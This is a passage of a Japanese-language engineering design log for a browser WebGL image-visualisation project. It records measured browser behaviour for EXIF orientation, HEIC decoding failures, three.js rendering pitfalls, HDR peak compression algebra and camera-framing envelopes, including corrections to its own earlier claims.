ここを 1e-9 で締めると**正しい実装が落ちる**（最初そう書いて落ちた）。

---

### 4.12 EXIF の向きは切れない —— だから回さない（Phase 1a-ii で実測）

設計案は「EXIF を自分でパースして、自分で画素を回す」だった。**Chrome では確実に
二重適用になる。** `canvas.toBlob('image/jpeg')` の出力に APP1(Exif, Orientation=N) を
注入した 4×2 の JPEG（左上のみ赤）で測った:

| 入力 | 既定 | `imageOrientation:'none'` |
|---|---|---|
| EXIF 無し | 4×2, red(0,0) | — |
| Orientation=1 | 4×2, red(0,0) | — |
| Orientation=3（180°） | 4×2, red(3,1) | — |
| Orientation=6（90°CW） | **2×4**, red(1,0) | **2×4, red(1,0) ── 完全に同一** |
| Orientation=8（90°CCW） | **2×4**, red(0,3) | — |

`<img>` の `naturalWidth/Height` も 2×4。**降りる手段が無い。**

そして `{ imageOrientation: 'lens-bogus' }` は **TypeError を投げる** ──
つまり `'none'` は「黙って無視された未知メンバ」ではなく、**認識された上で無効**である。
§4.7 が想定していた検出法（メンバを投げてみる）では**捕まらない**。

**残る検出手段は 1 つ: 向きの分かっている画像を実際に通す。**
`src/ingest/orientProbe.ts` に 317 バイトの JPEG（画素 2×1、EXIF は Orientation=6 のみ）を
定数で置き、実行時にデコードする:

| 返る寸法 | 判定 |
|---|---|
| **1×2** | `'applied'` ── デコーダが回した。**LENS は何もしない** |
| **2×1** | `'not-applied'` ── 読み出しに警告を出す。**自前回転は書かない**（Phase 1c で決着。下記）|
| それ以外 / 失敗 | `'unknown'` ── 安全側。「適用された」に倒さない |

「2×1 でなければ適用された」と書くと、probe 定数が壊れたときに**嘘をつく**。
だから 3 値にし、`ingest.test.ts` が probe のバイト列（Orientation=6 と SOF の 2×1、317 バイト）を
自前で読んで固定している ── 定数が壊れると probe は黙って `'unknown'` を返す、
つまり「向きの検証を諦めた」ことに誰も気づかないため。

**`'not-applied'` 用の自前回転は書かない（Phase 1c で決着）。** 1a-ii は「Chrome では絶対に
走らない」までしか言えず、必要性は水準 C だった。**Phase 1c で 2 エンジンぶん測った。**

8×8 の JPEG（左上=赤 / 右上=緑 / 左下=青 / 右下=黒）に APP1 を注入し、
デコード後の 4 象限を読んだ（**正方形なので寸法では区別できず、象限で見る必要がある**）:

| Orientation | 期待 | Chromium 148 | Chrome 150 | **Safari 18.6** |
|---|---|---|---|---|
| 1 / 2 / 3 / 4 | RGBK / GRKB / KBGR / BKRG | 一致 | 一致 | **一致** |
| 5 / 6 / 7 / 8 | RBGK / BRKG / KGBR / GKRB | 一致 | 一致 | **一致** |

**3 実装 × 8 値 = 24 セルすべてでデコーダが適用済み。** `imageOrientation: 'none'` も
**1〜8 の全値で既定と象限まで完全に一致**した（1a-ii の記録は `n=6` の 1 標本だった）。
本番の 317 バイト probe も Safari 18.6 で **1×2** を返し、`'applied'` と判定される。

→ **書けば、測った 3 実装すべてで到達不能な分岐になる。**

**残る未測定は Gecko（Firefox）だけ**である。
**Phase 2a で測った。`applied` だった。** ローカルへは何も入れず、GitHub の runner イメージ
（ubuntu-24.04）に在る**実物の Mozilla Firefox 152.0.6** で 1 回開いた（`npm run gecko`）:

| | |
|---|---|
| UA | `Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0` |
| デコード結果 | **1×2**（= `PROBE_ORIENTED`）|
| `imageOrientation: 'none'` | **1×2 ── 既定と一致** |
| 判定 | **`applied`** |

**これで 4 実装すべてが適用済みになった。** 「だから自前回転を書かない」の
**覆る条件（Gecko が `'not-applied'` を返す）は起きなかった**ので、あの行は **B → A** になる。

判定は出荷している `probeOrientationSupport()` に出させている ── ここで書き直すと、
測っているのは probe ではなく測定用に書いた別の実装になる。

**ハーネスは、既知のエンジンで既知の答えを再現してから使った**（§7.2 の規律）。
その自己検査が**自分のバグを 2 件**捕まえている: `decideOrientationSupport` は
2 引数ではなく 1 オブジェクトを取る／**`close()` した `ImageBitmap` は `width`/`height` が
0 になる**ので、比較の前に読まなければならない。
さらに、自己検査のログが「Gecko の結果」として読まれないよう、
**UA からエンジンを判定して結果の隣に出す**（§7.9 の SwiftShader/Metal の事故と同じ形）。
そして 1b までこの節が書いていた
「この環境では測れない」は**偽だった** —— `/Applications/Safari.app` は最初から在り、
`open -a Safari` とローカル http でのログ回収で測れる。**測定の限界ではなく、
確認せずに書いた否定形の断定**だった（§0.1 規律 2）。Firefox については
「入っていない」が正しく、A に上げる手段は probe を 1 回開くことだけである。

### 4.13 機能検出には 2 つの質問がある（Phase 1a-ii で実測）

**「メンバが実装されているか」と「実際に効いたか」は別の質問である。**
§4.12 の `imageOrientation` がまさに、**実装済みなのに効かない**例だった。

| 質問 | 測り方 | 実測 |
|---|---|---|
| メンバは実装されているか | **不正な列挙値**を渡す。TypeError なら実装済み | `imageOrientation` / `resizeQuality` / `colorSpaceConversion` / `premultiplyAlpha` すべて実装済み。対照の存在しないメンバは投げない |
| 実際に効いたか | `bitmap.width` を要求値と比較（§4.7） | `resizeWidth/Height` は効いた |

両方を測って両方を持ち回る（`src/ingest/capabilities.ts`）。判定は純関数
`summarizeCapabilities()` に切り出してあり、node でテストできる。

**測れないものもある。** `premultiplyAlpha` が効いたかを読み出す API は無い（水準 **B**）。
1a は不透明画像しか扱わないので無害だが、α を軸にする Phase 6 では効いてくる。

もう一つの黙殺: **同じキャンバスに 2 回目の `getContext('2d', 別の属性)` を呼ぶと、
最初の context がそのまま返り、属性は無視される**（実測）。`willReadFrequently` を
指定したつもりで効いていない、が起こるので、キャンバスは毎回使い捨てにする。

### 4.14 取り込みの CPU と、worker が肩代わりしているもの（Phase 1a-ii で実測）

`npm run bench`（`src/bench/ingest.bench.ts`）。Apple M1 Max / Node 24.13.0 / vitest bench。

| 正準バッファ | `linearizeRgba` | `computeStats` | `lift` → ULTRA | 合計 |
|---|---|---|---|---|
| 2048×1365 (3:2) | 11.13 ms | 21.65 ms | 14.16 ms | **46.94 ms** |
| 2048×1536 (4:3) | 13.32 ms | 22.63 ms | 14.83 ms | **50.78 ms** |
| 2048×2048 (1:1・最悪) | 17.53 ms | 26.26 ms | 16.93 ms | **60.72 ms** |

16.7 ms のフレーム予算の **2.8〜3.6 倍**。

**worker が要るのはデコードが重いからではない。** `createImageBitmap` は 24MP・resize 込みでも
メインスレッドを最長 **0.3 ms** しか止めない（元からオフスレッド）。止めているのは
読み戻し以降 ── 上の表の合計である。

**そして正準バッファはメインではなく worker に常駐させる。** 設計案は「メインが
`linearizeRgba` の 13〜18ms を払わずに済む」ことしか見ていなかったが、大きいのは
`computeStats` と、**ティアが変わるたびに再実行される `lift`** のほう。
正準をメインに置くとその合計がメインに固定される。

メインへ渡すのは派生物だけで、これは小さい ── ULTRA でも `base` 3.04MB + `colors` 1.82MB、
`columnMeans` は 0.02MB。正準は最悪 48.00MB（2048×2048 の f32×3）。

| 正準バッファ | 画素数 | f32×3 | RGBA8 |
|---|---|---|---|
| 1:1 2048×2048 | 4,194,304 | **48.00 MB** | 16.00 MB |
| 4:3 2048×1536 | 3,145,728 | 36.00 MB | 12.00 MB |
| 3:2 2048×1365 | 2,795,520 | 31.99 MB | 10.66 MB |
| 16:9 2048×1152 | 2,359,296 | 27.00 MB | 9.00 MB |

**中間ピークは測っていない（水準 C）。** `performance.measureUserAgentSpecificMemory` は
`crossOriginIsolated` を要求し、GitHub Pages は必要なヘッダを設定できないので
**この作品では原理的に測れない**。40MP 入力の原寸 RGBA8 が 151.88 MiB であることは算術で分かる
── **これは測った数ではない。**

**Phase 1c でデスクトップの完走と遮断は A になった**（3 形状 × 3 回、最長 12.5 ms。§7.8）。
**iOS 実機は C のまま**で、2 つを同じ行に混ぜない ── 混ぜた瞬間に C を A に見せる飾りになる。

#### 転送リストを型から導出する

`postMessage(msg)` は転送リストを**忘れても動く**。動いたうえで構造化複製が走るだけなので、
症状は例外ではなく「なんとなく重い」である（実測: 32MB の往復が転送 **11.4ms** に対し
複製 **53.6ms**）。だから転送リストを呼び出し側の注意力に置かず、
`transferablesOf(res)` という**応答の形から決まる関数**にした。
応答の kind を足して書き忘れると `_AllResponseKindsListed` が `tsc` を落とす。

板（Phase 1a-iii のテクスチャ源）も同じ経路で返す ──
`OffscreenCanvas.transferToImageBitmap()` の返り値は Transferable で、
転送後は元が 0×0 になる（実測）。**これを 1a-ii のプロトコルに入れておかないと、
1a-iii が同じ画像をもう一度デコードすることになる。**

### 4.15 `InstancedBufferGeometry` の既定値は絵を消す（Phase 1a-iii で実測）

`InstancedBufferGeometry.js` の既定は `this.instanceCount = Infinity`。
per-instance 属性が 1 つも無いと three は `maxInstanceCount` を決められず、
`gl.drawArraysInstanced(POINTS, 0, n, Infinity)` が発行される。
WebIDL の `GLsizei` 変換で `Infinity` は **0** になるので:

| | |
|---|---|
| 描かれる点 | **0** |
| `gl.getError()` | **0（NO_ERROR）** |
| `renderer.info.render.calls` | **1**（ドローコールは出ている） |
| シェーダのコンパイル | 成功 |

**デバッグの取っ掛かりが 1 つも無い。** `instanceCount = 1` を明示すれば、
素の `BufferGeometry` と画素・ドローコールまで同一になる（§3 の主張はこの条件つきで真）。

→ `colorPointBatch.test.ts` が `geometry.instanceCount === 1` を機械で見る。
**`!== Infinity` ではなく `=== 1`** ── 0 や 2 のような誤った有限値も落とすため。

### 4.16 `texture.flipY` は `ImageBitmap` に効かない（Phase 1a-iii で実測）

`WebGLTextures.js:918-926`:

```js
const isImageBitmap = ( typeof ImageBitmap !== 'undefined' && texture.image instanceof ImageBitmap );
if ( isImageBitmap === false ) {
    state.pixelStorei( _gl.UNPACK_FLIP_Y_WEBGL, texture.flipY );
    …
}
```

`ImageBitmap` のときは `UNPACK_FLIP_Y_WEBGL` を**設定しない**ので、既定の `flipY = true` が
黙って無効になる。取り込み（§4.14）が板を `transferToImageBitmap()` で渡している以上、
素直に `new THREE.Texture(bitmap)` と書くと**板は上下反転して出る**。
標本 No.0 はアスペクト 1.6 なので寸法では気づけず、コンソールにも何も出ない。

→ 向きの規則は `createPlateTexture()` **1 関数に閉じ**、`repeat.y = -1 / offset.y = 1` で
UV 変換として明示的に戻す。**捕まえるゲートは G1 の二面体テストしか無い**ので、
板を実装したのと同じ PR で書くこと。

**関連して: `repeat` / `offset` は自前シェーダには掛からない。** あれは three の
組み込みシェーダが `uvTransform` uniform として適用するもので、`texture2D(map, uv)` を
自分で書いたら一切効かない。G5 のプローブを書いたとき、この規約を二重に通してしまい、
チェッカーではなく背景の平坦部をサンプルして「白も黒も中点も全部同じ値」という結果を得た。

### 4.17 読み戻しの型 —— `Uint8Array` は無音で全 0 を返す（Phase 1a-iii で実測）

composer のバッファは `HalfFloatType` である（加算合成が HDR を保持するため）。
これを `Uint8Array` で読むと:

| バッファ | 例外 | `gl.getError()` | 読めた値 |
|---|---|---|---|
| `Uint8Array` | **なし** | **1282 = INVALID_OPERATION** | **[0,0,0,0]** |
| `Uint16Array` | なし | 0 | 正常 |

`WebGLRenderer.readRenderTargetPixels` のガードは `EXT_color_buffer_half_float` があると
通ってしまう。つまり **§7.2 の #1 が警告している「隅を読んで #000000 を確認」が
常に緑になる失敗は、`preserveDrawingBuffer` ではなくここで待っている。**

→ 鎖の最後に **8bit の capture RT** を置いてコピーしてから読む。型が一致するので
`INVALID_OPERATION` は構造的に起きず、読める値は「画面に出るのと同じ sRGB 8bit」になる。

#### 自己検査そのものが「壊れていても緑」になった

`selfTest()` は既知の値を書いて読み返す。**最初この判定を
「全 0 でなく GL エラーが無ければ良し」と書いた** ── 書いた値と一致するかを見ていない。
測定器の自己検査が、まさにその測定器の失敗モードを踏んでいた。

原因は色空間で、`setClearColor` に sRGB で渡すと three が working(linear) へ変換してから
RT へ書くので、読み戻る値は指定した符号値と一致しない。**そこで厳密一致を諦めたのが誤り**で、
正しくは**リニアのまま指定する**（8bit で厳密に表せる値を置けば往復は恒等でなければならない）。

歯の確認: capture RT を half-float に壊すと `data-lens-capture="broken"` が立ち、
`readback()` は全 0 を返さず GL エラー 1282 で**投げる**。

### 4.18 `gainFor` は `Infinity` を返しうる —— 生きたゼロ除算（Phase 1b で実測）

`ksumLookup` の下端分岐 `ksum(F, max(0.25, s))` は `ceil(s) = 1` のとき
**中心 1 画素しか数えない**。その 1 画素が `r² > 0.25` に落ちると `ksum = 0` になり、
`gainFor(s0) = Infinity` が返る。`uGain` に Infinity が入ると
`vColor * (uGain * uWeight * w)` が全画面 Inf になるが、**GL エラーは出ない**。

| `s0` | `S = k·s0` | `gainFor` | 漸近値 0.453349 との誤差 |
|---|---|---|---|
| 0.15 | 0.578 | **Infinity** | —— |
| 0.25 | 0.963 | 0.063504 | −85.99% |
| **0.4149**（正準幅 2048 で列平均を描くと到達） | 1.597 | 0.687648 | **+51.68%** |
| 0.5 | 1.925 | 1.006661 | +122.05% |
| 0.8298 | 3.195 | 0.439287 | −3.10% |
| **0.86** | 3.311 | —— | **ここから ±2% 以内** |
| 2.2478（1a-iii の実機値） | 8.654 | 0.453073 | −0.06% |

**これは Phase 1b が踏みに行く場所だった** ── 列平均バッファの点数を正準幅
（最大 2048）にすると `s0 = 0.41 px` まで落ちる。対処は 2 段:

1. `gainFor` が入力を `MIN_CALIBRATED_S0 = 0.86` でクランプする（**戻り値は常に有限**）
2. `LINE_MAX_POINTS = 512` が、そもそもその領域へ近づかせない（§7.7）

アンカーの `s0 = 2.2478` は境界の 2.6 倍上なので、**クランプはアンカーに触れない**
（`gain` は 1a-iii と同じ 0.4530724335144705）。

### 4.19 読めない形式は「失敗したあと」に分類する（Phase 1c で実測）

**例外の中身では分類できない。** `createImageBitmap` の失敗は**入力の種類によらず完全に同一**で、
HEIC / type を偽装した HEIC / type 無し HEIC / ランダムバイト / 途中で切れた JPEG / 空 Blob /
PDF / SVG / AVIF マジックのみ の **9 種すべてで `name` も `message` も一字一句同じ**
（`InvalidStateError` / "The source image could not be decoded."）。
1b までの `decode.ts` はこの `name` を文言に埋めていたが、**この値は情報を 1 ビットも運んでいない。**

**そして MIME で事前に弾いてもいけない。** 三重に誤る:

1. **Safari は HEIC を読める**（実測: 781B の HEIC が Chromium 148 / Chrome 150 では
   `InvalidStateError`、**Safari 18.6 では 64×48**）。事前に弾くと**読める利用者から機能を奪う**
2. **`Blob.type` は空でも偽装でもよい**（実測: `image/jpeg` を名乗る HEIC も type 無しの HEIC も、
   まったく同じ失敗をする）。type は入力の性質を表していない
3. **`ftyp` は AVIF とも共通で、AVIF は Chrome が読める**。brand を見ずに ISO-BMFF を弾くと
   読める形式まで巻き込む

→ **デコーダに投げる。失敗した。そのときだけ先頭 12 バイトを見る**（`src/ingest/format.ts`）。
`ftyp` は必ずオフセット 4 にあり、major brand が `he` で始まれば `'heif'`。
網羅は追わない（外れたら `decode-failed` に落ちるだけで「読めない」という結論は変わらない）。
これなら Safari の経路は 1 バイトも変わらず、Chrome の利用者だけが正確な文言を得る。

**文面は「HEIC を JPEG に変換してください」にしない。** iOS では Safari で読めるので、
ここへ来るのは「iPhone で撮った写真を Mac / Windows へ移して Chrome で開いた」人である。
案内の宛先が違う。→ 「Safari で開く」「設定 → カメラ → フォーマット → 互換性優先」
「写真アプリから AirDrop / メールで送ると JPEG になる」の 3 つ（`src/copy.ts`）。

---

### 4.20 「包絡」は位相 0 の値だった —— 峰は 100 倍だった（Phase 2c-i で実測）

**2b までの HDR 測定は、ひとつ残らず位相 0 で行われていた。**
`readbackHDR` を使う箇所は `ladder.mjs` の G12 と G15 だけで、どちらも必ず
`freezeRotation(true)` + `resetRotation()` を撃つ。**位相を流したまま掃く測定は
repo に 1 行も存在しなかった。** その空白の上で `MEASURED_PEAK_ENVELOPE = 2.01758` が
「包絡」を名乗り、`PEAK_MARGIN = 1.25` がその上に載っていた。

実際に流して測った（ANGLE Metal / Apple M1 Max・988×778・標本 No.0・
bloom/grade オフ・圧縮オフ・`renderOnce` を 120 フレームずつ・全面の最大）:

| dimLevel | 記録値 | 位相 120 秒を流したときの生の峰 | 比 |
|---|---|---|---|
| 3 | 2.01758 | **101.0** | **50 倍** |
| 4.25 | 2.01758 | **266.75** | **132 倍** |

`d = 4.25` は**最初の 2 秒の標本ですでに 2.248** で記録値を超える。

#### 機構 —— `framingHold` が距離を固定し、図が前縮みする

`core/fit.ts` のピークホールドは、カメラ距離を**最も広がる位相**に必要な値へ固定する。
ところが図は狭い位相で画面のごく一部へ前縮みするので、**同じ総光量がはるかに少ない画素へ
集まる**。加算合成なので峰はそのまま跳ね上がる。実測の相関:

| 掃引時刻 | `fill.x` | 生の峰 |
|---|---|---|
| 2 s | 0.86 | 1.84 |
| 40 s | 0.2633 | 41.1 |
| 50 s | **0.0303** | **101.0** |

**カメラ距離が飽和した後も `fill.x` は下がり続ける**（実測: `dist` が 5.10 で止まってから
`fill.x` は 0.26 → 0.03）。つまり**これは `framingHold` を直しても消えない** ──
前縮みそのものは投影の性質であり、ピークホールドはそれを画面いっぱいに保てないだけである。
`fit.ts` の散文は 1b の時点で「図が本当に一点へ潰れる位相がある」と書いていた
（`max|x|` が 0.0367 〜 1.8965 の 50 倍で動く）。**書いてあったのに、HDR の峰と結び付けていなかった。**

#### 位相は閉軌道である（代数）

`advancePhases` は `φ_k += gate·ω_k·dt` なので `φ_k = ω_k·Φ`（`Φ = ∫gate dt` は全平面で共通）、
`readAngles` は `θ_k = gate·φ_k`。つまり **5 本の位相は 1 個のスカラの像**であって、
トーラス全体ではない。`ω × 1000 = (110, 70, 50, 30, 23)` の gcd は 1 なので、
軌道は**周期 2000π ≈ 6283.19 秒**（gate 時間）で閉じる ── 平面ごとに 110 / 70 / 50 / 30 / 23 回転。

→ **「位相は無限に流れ続けるので上限とは呼べない」という 2b の理由文は偽である。**
定義域はコンパクトなので、十分密な掃引は原理的に上限の証明になりうる
（最速 ω = 0.11 を Δθ ≤ 0.1 rad で刻むなら 6,912 標本 / dimLevel）。
**ただし本仕様はもう上限を要求しない**（§4.21）。

#### 見張る仕組み —— G16 と故障 `nosweep`

ラダーに 2 行足した（`d = 4.25`・位相 30 秒・300 フレーム刻み）:

1. **生の峰が記録値を超える** —— 実測 **32.9**（記録値の 16.3 倍）。
   超えないなら掃けていない、を意味する行
2. **配線ありで峰が 1.0 未満** —— 実測 **0.99854**

故障 `nosweep`（位相を進めない＝ 2b までの読み方）を注入すると 1 が落ちる。
**測る口が無いことは、その口の出力からは分からない** ── これが 2c-i の教訓であり、
G9 を 2 フェーズ腐らせたのと同じ形が、今度は「包絡」という名前の中に在った。

---

### 4.21 有限の設計峰ではクリップは消せない —— 余裕を捨てた（Phase 2c-i・代数）

ソフトニーの上限は `x → ∞` の極限で

```
sup y = k + 1/s
```

一方 `s(V) = (V − 1)/((1 − k)(V − k))` は、`V > 1` かつ `k < 1` なら
`(V − k)/(V − 1) > 1` なので

```
1/s(V) = (1 − k)(V − k)/(V − 1) > 1 − k    ⇒    sup y > k + (1 − k) = 1
```

**どんな有限の設計峰 V を選んでも、上限は厳密に 1 より大きい。**
つまり「実測の包絡に余裕を掛ける」という 2b の設計は、**余裕を何倍にしてもクリップを消せない**。
`PEAK_MARGIN = 1.25` は上限を **1.02628** にしていただけで、実測の生の峰 101 / 266.75 は
どちらも 1.0258〜1.0261 へ写り、`OutputPass` で **255 に張り付いていた**
（実測: 出荷配線・`d = 4.25` で 1.0 超が 2,000〜3,700 画素）。

→ **`V → ∞` の極限を直接置く。**

```
COMPRESS_MAX_STRENGTH = 1 / (1 − COMPRESS_KNEE) = 5
```

`s(V)` はこの値へ単調増加するが達しないので、極限そのものを取ると
`[k, ∞) → [k, 1)` の**全単射**になる。クリップが**構造的に起きない** ──
峰がいくつであっても 1.0 に届かない。よって:

- **包絡の測定に一切依存しない。** 掃引の密度にも、機体にも、
  2c-ii が `framingHold` をどう直すかにも依存しない
- 門と同じ規律である ── **「測ったらそうだった」という偶然に錨を預けない**

`PEAK_MARGIN` と `COMPRESS_DESIGN_PEAK` は削除した。`strengthForPeak` は**却下した設計**として
残してあり、`compress.test.ts` が「有限の峰では上限が必ず 1 を超える」を検算する。

#### これは見え方の判断ではなかった

代償と便益を、この作品自身の単位（ΔE00・`deltaE2000Linear`）で測った:

| | ΔE00 | 参考 |
|---|---|---|
| 代償（門が全開のとき、リニア 1.0 の行き先が sRGB 244.18 → **243.45**） | **0.151** | JND ≒ 1.0 の 1/7 |
| 便益（2b がクリップで潰していた帯 = 生の値 2.522 以上の全幅） | **0.462** | 忠実性の門 2.0 の 1/4 |

**両方とも知覚閾の下である。**「白がわずかに沈む」も「潰れた帯に階調が戻る」も見えない
（生の値が 2.52 でも 266.75 でも、2c の行き先は sRGB 252.65 と 254.98 で 2.33 コードしか違わない）。
→ **この選択は見え方では決まらない。** 決めた基準は 2 つ:

1. **その主張が機体と測定の粗さから独立に真であり続けるか。** 2b の「峰は 1.0 以下」は
   生の峰が 2.522 を下回るときだけ真で、出荷経路では偽だった（実測 1.0244）。
   しかも**偽であることを確かめる測定が存在しなかった**
2. **2c-ii のあとも生き残るか。** `framingHold` を直せば峰は桁で動く。
   2b の設計では触るたびに余裕を導出し直すことになる。2c は峰を参照しないので二度と触らない

**錨はどちらでも動かない** ── アンカー窓では `rotationGate` が厳密に 0 なので、
`d ∈ [1.9, 2.1]` は 1 ビットも変わらない。この判断が及ぶのは、
**写真がすでに点の雲へ解けている領域だけ**である。

---

### 4.22 構図を時間の関数でなくした（Phase 2c-ii で実測）

`framingHold` はピークホールドなので、**同じ `dimLevel` に留まると図が単調に小さくなる**。
実測（`d = 3`・ANGLE Metal / M1 Max・988×778・標本 No.0）:

| 経過（gate 時間） | カメラ距離 |
|---|---|
| 0 s | 2.9682 |
| 20 s | 4.8245 |
| 140 s | **6.0446**（**2.04 倍** ＝ 見かけの大きさが約半分） |
| 300 s | 6.0446（以降 160 秒 1 度も動かない） |

**押しているのは横幅ではなく `zHi` である** ── 峰の瞬間の `aX` は 0.305 しかない。
点が一度でもカメラ側へ振れると、カメラはその分だけ下がったまま戻らない。

問題は見た目より**測定**にある。カメラ距離が経過時間の関数だと、
**`d ≠ 2` の測定値が「そこに何秒いたか」で変わる** ── §4.20 と同じ型の穴である。

#### 先に計算できる根拠は 2 つ

1. **位相は閉軌道**（§4.20）。`gate` は `s` を定数倍するだけで、
   **到達する角度の集合を変えない**。だから `s ∈ [0, 2000π)` を掃けば尽きる。
2. ~~**候補はノルム上位だけでよい**。~~ → **偽**（下の訂正 2）。
   `safeDist` の導出が言うのは「ノルム `r` の点が**出しうる**半径の上界 `r·dist/(dist − r)` が
   `r` について単調増加」であって、**「ノルム最大の点がその位相で最大を取る」ではない。**
   「候補 32 点と 128 点が 4 桁すべて一致」は真だが、それは**標本 No.0 の性質**である。

#### 費用は実測で決めた（`d = 3`・HIGH 格子 378×236）

| 位相数 M | need | 収束値との比 | 費用 |
|---|---|---|---|
| 256 | 6.3548 | 92.3% | 1.2 ms |
| 1024 | 6.6645 | 96.9% | 2.5 ms |
| **4096** | **6.8693** | **99.83%** | **8.0 ms** |
| 16384 | 6.8804 | 99.99% | 30.5 ms |
| 65536 | 6.8813 | ―（収束） | 115.9 ms |

`dimLevel` を 0.25 刻みの表にし、**各スロットは 1 セッションに 1 度しか計算しない**。
**参考: ブラウザで実時間 300 秒（軌道の 4.8%）掃いて到達したのは 6.0446** ──
この見積もりは、5 分間眺めても見つからない極値まで先に押さえている。

**見積もりであって上界ではない**（候補を絞り、位相も有限個しか掃かない）。
~~だから `framingHold` は外さない。上界の役はホールドが引き続き持つ。~~ → **偽**（訂正 1）。

#### 包絡は門で入れる —— 素で入れると写真が突然縮む

素の包絡をそのまま使ったら、**`d = 2.1 → 2.11` でカメラが 1.9636 → 4.7330（2.41 倍）跳んだ**。
そのとき板の重みはまだ **0.9976** で、**写真はまだ見えている** ── 写真が突然 41% に縮む。
**見えていない雲のために構図を決めてはいけない。**

→ 板から包絡へ `cloudWeight` で渡す。圧縮（§4.21）・回転・板と雲のクロスフェードと
**同じ 1 つの門**である。実測: `d = 2.11` で充填 0.8600 → **0.8593**（ほぼ不動）。

| d | 門 | 板の重み | カメラ距離 | fill.x |
|---|---|---|---|---|
| 2.1 | 0.0000 | 1.0000 | 1.9636 | 0.8600 |
| 2.11 | 0.0024 | 0.9976 | 2.0752 | 0.8593 |
| 2.2 | 0.1983 | 0.8017 | 2.3618 | 0.7812 |
| 2.45 | 1.0000 | 0.0000 | 5.1938 | 0.3551 |
| 3 | 1.0000 | 0.0000 | 6.8693 | 0.2870 |

#### 残した代償 —— 門の途中の帯では後退が残る（**両側にある**・Phase 2c-iv で量を測った）

門の傾斜帯では目標が包絡に届かないので、ホールドがまだ育つ。**これは二律背反である** ──
その帯では写真がまだ見えており、先に引けば写真が縮む。
「見えているものを外へ出さない」ほうを優先した。

2c-ii は上側 `(2.1, 2.45)` だけを書いていたが、**下側 `(1.55, 1.9)` も同じ**である。
実測（18,000 フレーム＝ 5 分・標本 No.0・node）:

| d | 門 | 1F 目 | 初めて動く | 300 秒後 | 倍率 |
|---|---|---|---|---|---|
| **2.20** | 0.1983 | 2.926651 | 679F（11.3 秒） | 3.961599 | **×1.354** |
| 1.80 | 0.1983 | 2.897488 | 2773F（46.2 秒） | 3.667927 | ×1.266 |
| 2.30 | 0.6064 | 4.116488 | 696F（11.6 秒） | 4.513837 | ×1.097 |
| 1.65 | 0.8017 | 3.881480 | 3893F（64.9 秒） | 4.077004 | ×1.050 |
| 2.0 / 2.5 / 3 / 4 / 4.25 / 5 | ── | | **動かない** | | ×1.000000 |

**門が全開の領域では後退は厳密にゼロ**である。

#### なお、出荷経路では誰もこれを見ていない

`dimLevel` を動かすものが出荷経路に無い（UI は Phase 3。`main.ts` で `setDimLevel` を
呼ぶのは DEV フックだけ）。**この後退は今日の利用者には一度も起きていない** ──
起きるのは測定のときだけである。それでも直した理由は、上のとおり測定の再現性にある。

**ただし下の訂正 3（`layout()` で包絡が消える）は利用者に起きていた** ── `relayout()` は
`engine.onResize` に配線されているので、`dimLevel` を動かさなくてもリサイズだけで踏む。

### 4.22.1 訂正 —— 2c-ii が確かめずに書いた 3 つ（Phase 2c-iv で実測）

**独立監査を 5 体並列で立て、待つあいだに自分でも測った**（§8 の運用）。
2c-i では 3 体とも「HDR の測定が全部位相 0」に到達しなかったが、**今回は到達した** ──
下の訂正 2 と 3 は監査が実測で見つけたものである。

#### 訂正 1 —— **「`framingHold` を外すと図が帯を出る」は偽**

図が帯を出ないことを担っているのは包絡でもホールドでもなく、**毎フレームの実測 `spread`** である。

`lensScene.updateCamera` は `liftProject5` が**これから描くフレームの**位置を書いた直後に
呼ばれる（`engine` の `frameCallbacks` は `composer.render()` の**前**に走る）。
`framed = unionSpread(spread, target)` は成分ごとの `max` なので `framed ≥ spread`、
`needDistance` は `aX` / `aY` / `zHi` のいずれについても単調非減少、
`framingHold` は `need` を下回る値を返さない。ゆえに

```
D − S.zHi ≥ max(S.aY/band, S.aX/aspect) / (fill·t)
ndc.x = S.aX / ((D − S.zHi)·t·aspect) ≤ fill = DEFAULT_FILL     （等号成立）
```

実測でも、遷移・定常・無作為跳躍・退化画像・3 ティア・`setPath('cloud')` を合わせて
**約 39 万フレーム**掃いて、`stats().fill` の最大は**どの掃きでも厳密に 0.86000000**、
1.0 に近づく経路すら無かった。スプライト半径を足しても最悪 **0.874**
（余白 14% に対し半径 1.4%・実 viewport `pxPerWorld = 834.213`）。

→ **包絡が外れても、図は帯を出ない。**包絡とホールドが守っているのは
「**大きさが時間で変わらないこと**」であって「収まり」ではない。
2 つを 1 つの文に混ぜて書くと、**外れた見積もりが安全性の問題に見える** ──
`framingEnvelope.ts` はこの誤りを 2 か所、`fit.ts` は箇条書きに 1 か所持っていた。

#### 訂正 2 —— **候補 32 は標本 No.0 でしか足りない。そして K を上げても直らない**

位相ごとに、上位 32 が真の argmax を含むかを全 89,208 点と突き合わせた（No.0・M=512）:

| d | `aX` の argmax を外した位相 | 外したときの最悪比 |
|---|---|---|
| 0.5 / 1.5 | 0 / 512 | 100.00% |
| 2.5 / 3.0 | 276 / 278 の 512 | 37.48% / 26.91% |
| 3.5 / 5.0 | 324〜378 / 512 | **0.00%**（32 点全部が原点付近へ潰れる） |

一般の標本では包絡が不足する（`need` 比・M=4096・基準は全点）:

| 標本 | d | `need` 比 | `|{n ≥ 0.99·max}|` |
|---|---|---|---|
| No.0 1024×640 | 3〜5 | 100.000% | 69 |
| 1024×640 色相スイープ（**普通のアスペクト**） | 5.0 | 98.465% | 242 |
| 1024×1（1 行） | 5.0 | **91.119%** | ― |
| 1024×64（横長） | 5.0 | **91.572%** | **4252** |

**この表は `SPECIMEN_LEDGER` では復元できない**（Phase 2c-ix で実測）── 同名の標本を
台帳で作って測り直すと、予測子は 色相スイープ **1** / 横長 **37**（No.0 の 69 は一致）、
`need` 比は 横長 **100.000%** / 1 行 **97.140%** で、**予測子としての順序ごと壊れる**。
「2048 → 8192 に崖がある」も台帳の標本には無い（K=32 で既に 100.000%）。
**別物を測っているからである**（型 3）── 引用された 3 標本は repo に無く、
`image/fixture.ts` の「台帳で測り直した値に置き換える」は**未履行**である。

**割れる条件はアスペクトではなく「ノルム分布の上が平ら」であること。**
上位が同値に近いと、上位 32 は事実上任意の部分集合になり、しかも空間的に固まる。

**定数を上げても直らない**（横長 `d=5` の `need` 比 / 1 スロットの費用）:
128 → 91.66% / 27 ms、512 → 91.66% / 102 ms、2048 → 91.79% / 412 ms、
**8192 → 100.000% / 1634 ms（現行の 202 倍）**。
2048 と 8192 のあいだに崖があり、8192 は `ENVELOPE_DIM_STEP` の存在理由（費用の有界化）を壊す。
→ **順位づけの規則そのものを見直さないと直らない。**

参考（同じ 32 点で規則だけ替えた実測・M=256）: 「上位 16 ＋ 全点の等間隔 16」は
